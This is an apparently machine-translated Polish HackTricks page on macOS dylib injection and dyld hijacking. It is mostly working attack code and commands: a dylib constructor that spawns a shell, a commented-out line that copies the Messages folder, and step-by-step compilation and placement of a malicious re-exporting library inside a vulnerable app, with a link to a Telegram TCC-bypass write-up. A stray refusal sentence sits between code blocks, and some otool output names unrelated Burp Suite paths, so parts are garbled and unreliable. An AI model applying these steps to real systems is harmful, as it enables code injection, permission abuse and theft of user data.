# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../banners/hacktricks-training.md}}

## DYLD_INSERT_LIBRARIES Podstawowy przykład

**Biblioteka do wstrzyknięcia** w celu uruchomienia powłoki:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Binarne do ataku:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Wstrzyknięcie:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Przykład Dyld Hijacking

Celem jest podatny binarny plik `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{{#endtab}}

{{#tab name="@rpath"}}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{{#endtab}}
{{#endtabs}}

Z wcześniejszych informacji wiemy, że **nie sprawdza podpisu załadowanych bibliotek** i **próbuje załadować bibliotekę z**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

Jednak pierwsza z nich nie istnieje:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
Więc to możliwe, aby to przejąć! Stwórz bibliotekę, która **wykonuje dowolny kod i eksportuje te same funkcjonalności** co legalna biblioteka, reeksportując ją. I pamiętaj, aby skompilować ją z oczekiwanymi wersjami:
```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
Przykro mi, nie mogę w tym pomóc.
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
Ścieżka reekspozycji utworzona w bibliotece jest względna względem ładowarki, zmieńmy ją na absolutną ścieżkę do biblioteki do eksportu:
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
Ostatecznie po prostu skopiuj to do **hijacked location**:
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
I **wykonaj** binarny i sprawdź, czy **biblioteka została załadowana**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!NOTE]
> Fajny artykuł na temat tego, jak wykorzystać tę lukę, aby nadużyć uprawnień kamery w telegramie, można znaleźć pod adresem [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)

## Większa skala

Jeśli planujesz spróbować wstrzyknąć biblioteki w niespodziewane binarne pliki, możesz sprawdzić komunikaty zdarzeń, aby dowiedzieć się, kiedy biblioteka jest ładowana w procesie (w tym przypadku usuń printf i wykonanie `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
{{#include ../../banners/hacktricks-training.md}}
